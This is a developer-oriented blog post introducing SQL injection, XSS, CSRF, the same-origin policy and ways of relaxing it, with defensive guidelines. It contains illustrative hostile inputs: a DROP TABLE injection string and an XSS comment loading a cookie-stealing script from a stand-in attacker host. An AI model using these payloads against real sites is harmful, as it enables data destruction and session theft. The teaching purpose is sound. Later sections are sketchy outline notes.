---
layout: post_simple
title:  "An Introduction to Injection, XSS, CSRF, and Practicing Safe Security"
date: 2015-05-28
author: "Clark Feusier"
excerpt: "In this post, we will discuss practical web security. We will start by covering the <strong>who</strong> &mdash; who you need to protect against. Next, we will cover the <strong>what</strong> &mdash; what common exploits you need to know about and protect against. Finally, the <strong>how</strong> &mdash; how to protect against the common exploits, including code examples. If you are interested, let us begin..."
tags:
- web security
- xss
- csrf
- injection
- best practices

---

<blockquote><h2>Every user of your web app is trying to break it</h2></blockquote>

In this post, we will discuss ***practical web security***.

We will start by covering the **who** &mdash; who you need to protect against. Next, we will cover the **what** &mdash; what common exploits you need to know about and protect against. Finally, the **how** &mdash; how to protect against the common exploits, including code examples.

If you are interested, let us begin.

---

# Trust. No. One.

<blockquote><h2>Your users are usually evil or dumb</h2></blockquote>

You should love your users, kind of. You should also **fear** them. For our purposes, there are three different types of user against which you need to protect.

1. evil users
1. dumb users
1. careless users

**Evil Users**:

This is the obvious category &mdash; there are real black-hat hackers, cyber-terrorists, and ubiquitous bots probing the web for weakness around the clock.

**Dumb Users**:

Users cannot always figure out which link to click, what format they should use to input their data, how to create secure passwords, how to submit an order, **ad nauseaum**.

**Careless Users**:

This group is you and your engineering team. The late night merge, the mistyped database command, and the junior developer will break your soul when you are least expecting it.

Now, ***combine all three groups*** &mdash; dumb and careless users make it easy for evil users to discover exploits. **TL;DR** &mdash; you need to care about web security and you need to act to protect your products and systems.

### But, how much do I really need to care about web security?

If you are reading this post, I assume that you are learning about web security in order to protect an 'average' website or application.

What do I mean by **average**?

Are you engineering a product for a Fortune 500 company? Are you working on web technology for a financial institution? Are you processing and/or storing credit card information **on your servers**? Are you protecting confidential government information?

If you answered **yes** to any of the above, I am a little nervous that you are reading this... If you answered **no** to all of the above, then start by securing against the following common exploits.

---

# Common Exploits

At a high-level, we will cover two different types of web application exploit &mdash; **injection** and **cross-site request forgery**. We will start with injection.

## Injection

As a general approximation, we can say that **code injection** is an exploitation that occurs when an application ***sends untrusted data to an interpreter*** that alters the intended logic of the program, usually maliciously ([source](http://en.wikipedia.org/wiki/Code_injection)).

We will talk about important types of code injection &mdash; SQL injection and HTML/script injection.

### SQL Injection

**SQL injection** is an exploit that injects a SQL database command in order to read or modify the database ([source](http://en.wikipedia.org/wiki/SQL_injection)).

This is a very common, dangerous, yet easy to prevent exploit. Imagine that some asshole wanted to drop your production database (containing all of your customer data). Now, imagine that you have a login form that allows users to login to your application via a username and password combination.

Now, it could be the case that your form sends a POST HTTP request to a server, which then composes a SQL query out of the form data. The SQL query could be something simple like the following:

<script src="https://gist.github.com/Cfeusier/02e7c0af21e579035a7e.js"></script>

If your server hits a database with the above SQL query, the server will get back all of the user records with `Username` and `Password` for the `username` and `password` fields. Assume the authentication is based on such a simple presence validation.

Now, imagine that the aforementioned butthead submits some evil data via your login form. Maybe she enters `Username` in the `username` form-field, and then for the `password` she enters `"Password';DROP TABLE users"`.

If your SQL query API allows for multiple statements to be executed in a single call, then your SQL server will execute something similar to the following:

<script src="https://gist.github.com/Cfeusier/daade1fb33eca133e4f1.js"></script>

Goodbye user data. The `';DROP TABLE users'` string was the **injected** SQL code, which was unknowingly executed by the SQL server, resulting in the loss of all your user data.

Please take the following away from this section &mdash; ***SQL injection flaws occur when a SQL database server interacts with the database using statements composed out of data from an external source***.

But, you need to dynamically query your database, so how do you avoid SQL injection exploits? Here are some good guidelines. Note, these topics will be expounded upon further in the section below covering protection mechanisms.

1. always write SQL statements that use parameters instead of direct variable evaluations
1. (optional) use an ORM that generates parameterized statements
1. validate input data using well-tested regular expressions
1. escape characters that have special meaning within SQL

I will describe the above protection techniques in detail after we have covered all of the different exploits. Let us move on to another injection exploit called **XSS**, which stands for *cross-site script injection*.

### XSS - Cross-Site Script Injection

**XSS**, **cross-site script injection**, or **cross-site scripting**, is an exploit that injects a script into a web document. When other users view the compromised web document, the script is executed by the client environment with the same access to resources as the surrounding web document. With the granted resource-access, the malicious script can run amok with private content, session cookies, localStorage data, and more ([source]()).

XSS comes down to getting a script into some web document that will be sent to a client web-browser; the script gets treated as though it is delivered from a trusted source, so it can access certain privileged information in the environment. Usually, the script will capture the privileged information and send it to a server of its choosing for later use.

Here is the usual example of an XSS exploit, as described by [Wikipedia](http://en.wikipedia.org/wiki/Cross-site_scripting) (slightly modified):

- Hacker observes that your website contains an XSS vulnerability &mdash; the comments section will display whatever is typed for a new comment, even if the comment text contains HTML tags, so all script tags are executed
- Hacker posts a new comment with the following text:

    > I love the puppies in this story! They're so cute!`<script src="http://hackityhack.com/authstealer.js">`

- The `authstealer.js` script accesses the current user's authorization cookie and sends it to a secret server for storage
- Now, when anyone visits the webpage with Hacker's comment, the `authstealer.js` script will run and steal the current user's authorization cookie data
- Hacker can now impersonate visitors with valid accounts on your website &mdash; e.g., Hacker could login as a user and steal the credit card information stored in the account profile of the impersonated user

Takeaway from this section: ***XSS flaws occur when a web document is vulnerable to injection of foreign scripts executed unknowingly by a client environment.*** This often occurs through the acceptance of unsanitized user input.

But, you need to accept user input throughout your site! How do you avoid these XSS vulnerabilities? Similar to the protections against other ***injection*** exploits, here are some guidelines to avoid XSS exploit:

1. escape unstrusted input strings &mdash; there are many available security encoding libraries
1. sanitize HTML input &mdash; there are many available sanitization engines
1. don't store private information in session cookies &mdash; session data is *public*, for the most part

Let us proceed to the last exploit-type that we will cover in this post, before we circle back to protection mechanisms. This final exploit, ***cross-site request forgery***, hereforth **CSRF**, will take our discussion into the rapidly-changing world of browser security policy. ***On y va***.

## CSRF - Cross-Site Request Forgery

Cross-site request forgery, **CSRF**, XSRF, one-click attack, or session-riding, is a type of ***confused deputy exploit***. At a high-level, the web browser is confused by an HTTP request that forges the identity of a legitimate user. The web browser unknowingly misuses the authority of the legitimate user in service of the request forger.

What does CSRF look like in practice?

Usually, a hacker finds a way to place a link, image, or script into a web document where a legitimate user will be logged-in. A legitimate user visits the website, is authenticated, visits the page that serves the web document infected with the hacker's code, and is enticed to execute the hacker's bait. Then, the hacker can 'ride' the legitimate user's authenticated session and **forge** a request that appears as though it was made by the legitimate user &mdash; usually, the forged request does something naughty while it has the legitimate user's permissions.

The above scenario assumes that the exploited site is storing the legitimate user's authentication data in a session cookie that has not expired. Here is another example, though more specific:

- Let's assume that a hacker posts a comment with a link on `https://origin-site.com` &mdash; the link source looks like this: `<a href="http://hackity-hack.com/squeeze-page">THIS IS SO IMPORTANT YOU NEED TO SEE IT!</a>`
- Let's also assume that `https://origin-site.com` is a webpage where a legitimate user is usually authenticated
- A legitimate user visits `https://origin-site.com` and is authenticated &mdash; a session-cookie is planted to authenticate further requests
- This user sees the hacker's comment with the link and obviously **needs** to see where this link goes; ***click***
- The legitimate user of `https://origin-site.com` is transported by the web browser to `http://hackityhack.com/squeeze-page`, where the following script is run:

<script src="https://gist.github.com/Cfeusier/3463967d1328a34ab7bf.js"></script>

- Finally, let's assume that the `/user-data` endpoint responds with all of the user's sensitive data, if the requestor is authenticated
- The hacker appears to be a legitmate requestor and receives the sensitive data
- The hacker sends the sensitive data directly to his server to save for later use

Takeaway from this section: ***CSRF exploits occur when a party forges a request to a website as a user that is 'trusted', confusing the web browser into performing commands on behalf of the forged user***.

Thankfully, **the above CSRF attack will not work**.

Enter ***the web application security model*** &mdash; in our case, the **same-origin policy** for XMLHttpRequest asynchronous requests. Let us quickly turn our attention to the same-origin policy and how it prevents the above attack.

### The Same-Origin Policy (XHR)

The **same-origin policy** for XHR (SO policy for this section) is a concept from the browser security model for web applications. Note well, all major web browsers implement some form of a SO policy, though the details of implementation may differ.

Roughly, the SO policy only allows scripts from one webpage to access data from another webpage, if *both* webpages have the same **origin** ([source](http://en.wikipedia.org/wiki/Same-origin_policy)).

In order to understand how the SO policy prevents the above CSRF attack, let's dissect the SO policy.

What does it mean for a webpage to have the **same** ***origin*** as another webpage?

> Two webpages have the ***same origin*** if and only if both webpages are served from the same combination of **URI scheme, hostname, and port number**

For example, `http://` and `https://` are **different** protocols (part of the URI scheme) &mdash; they generate different origins. Similarily, `www.site.com` and `v2.site.com` are different hostnames, thus, they generate different origins according to the SO policy. Finally, `http://site.com` and `http://site.com:4001` have different port numbers, so they have different origins.

Now, we can see how the SO policy prevents the above CSRF attack &mdash; the SO policy requires that the two webpages have an ***exactly matching*** origin, but `https://origin-site.com` and `http://hackityhack.com` **do not** have a matching origin. So, the browser's implementation of the SO policy should catch the forged request and disallow it.

Great, the SO policy saves us from some CSRF exploits. So, why are we talking about CSRF?

**Life is never that simple...**

For most production applications, the SO policy is *too restrictive*! Also, extra protection measures are required to stop many types of CSRF exploit.

Let's tackle the latter complication first &mdash; how to add extra protection based on the SO policy to prevent a larger swath of CSRF exploit.

**CSRF Tokens &mdash; Cookie-to-Header Tokens**

Web applications can be further secured against CSRF by using ***CSRF tokens***, also called *cookie-to-header tokens*. Here is the idea &mdash; when a user is authenticated, a session cookie is set with a random token, which is copied into a custom HTTP header on the client.

The client can then send the custom header on each request, allowing the server to check the incoming request for integrity. Note, this technique relies directly on the SO policy &mdash; JavaScript from the incorrect origin will be forbidden from reading the value of the token out of the cookie.

We are now aware of how to secure against CSRF, how the SO policy helps in this cause, and how cookie-to-header tokens are used for extra security. Let's circle back to the earlier caveat &mdash; the SO policy is ***too restrictive***.

**Safely Circumventing the SO policy**

What does it mean to say that the SO policy can be ***too restrictive***?

Most web applications these days are not islands &mdash; they consume and serve resources with other applications, which may be on different domains. The SO policy makes asynchronous HTTP communication between applications on different domains quite difficult. For example, large applications tend to be fragmented into modules using subdomains like `store.site.com` and `admin.site.com` &mdash; the SO policy considers `store.site.com` and `admin.site.com` to be of different origin, so resource sharing between the components will require a **circumvention of the SO policy**.

There are **multiple options** for circumventing the SO policy. ***Note well, none of the options is perfect, nor will any of the options be one hundred percent cross-browser compatible***. I will do my best to clearly state the tradeoffs of each option, and I will provide a fun decision-tree at the end to help you choose the best option for your use-case.

The options for 'relaxing' the SO policy, which I will briefly discuss in turn, are ***cross-origin resource sharing (CORS), JSON with padding (JSONP), `document.domain` manipulation, and the `window.postMessage` message system***.

### Cross-Origin Resource Sharing (CORS)

> CORS defines a way in which a browser and server can interact to safely determine whether or not to allow the cross-origin request. It allows for more freedom and functionality than purely same-origin requests, but is more secure than simply allowing all cross-origin requests. It is a recommended standard of the W3C ([source](http://en.wikipedia.org/wiki/Cross-origin_resource_sharing)).

<script src="https://gist.github.com/Cfeusier/e9868ed6e7c5a24e8983.js"></script>

- allows server to opt into serving requests that come from a different origin
- extends HTTP by adding a new request header option named `Origin` and a corresponding response header option named `Access-Control-Allow-Origin`.
- server can whitelist requestor domains (exact or pattern-match)
- not supported fully &mdash; IE 10+, Firefox 3.5+, Safari 4+, and Chrome 10+ supported
- `"access-control-allow-<option>"` &mdash; `origin`, `methods`, `headers`, `max-age`
- `"access-control-allow-methods": "OPTIONS"` needs to be set

([source](http://en.wikipedia.org/wiki/Cross-origin_resource_sharing))

**Websockets + Whitelisting**

- same concept as XHR CORS, except with websockets instead of XHR requests

### JSON with Padding (JSONP)

- GET requests only
- older than AJAX
- SOP isn't enforced on script tags
- script tag makes a request with a file and a callback function that receives the response and can sanitize the response

### Setting `document.domain`

- Set `document.domain` to the same domain on two different documents &mdash; will relax the SOP for those two documents (only those two domains though)

### `window.postMessage`

- new API for messaging between windows added to browser soon
- event system, kind of

## Choosing Between Techniques to Safely Relax the Same-Origin Policy

- CORS
- JSONP
- `document.domain`
- `window.postMessage`

### Cross-Domain Decision Tree (credit [@mracus](https://twitter.com/mracus))

> ***Do you need to make a cross-domain request using older browsers?***

- **No** &mdash; use CORS
- **Yes** &mdash; ***Is there a lot of data in the request?***
    - **No** &mdash; use JSONP
    - **Yes** &mdash; ***Is there a lot of data coming back in the response?***
        - **No** &mdash; use iFrames
        - **Yes** &mdash; use a mixture of CORS, JSONP, `window.postMessage`, and `document.domain` (try not to hate life)

---

# Simple Protection Mechanisms

- motivate low-hanging fruit protection mechanisms
- differentiate between injection and CSRF protection mechanisms

## Protecting against Injection

- Parameterized Statements
- Input Validation
- Escaping and Sanitization
- Smart-use of Session Cookies

## Protecting against CSRF

- Same-Origin Policy (for free)
- Cookie-to-Header Tokens

---

# Practice Safe Security

- care about security
- know the common exploits
- prevent low-hanging fruit exploits
- learn how to relax the SOP without exposing your web app

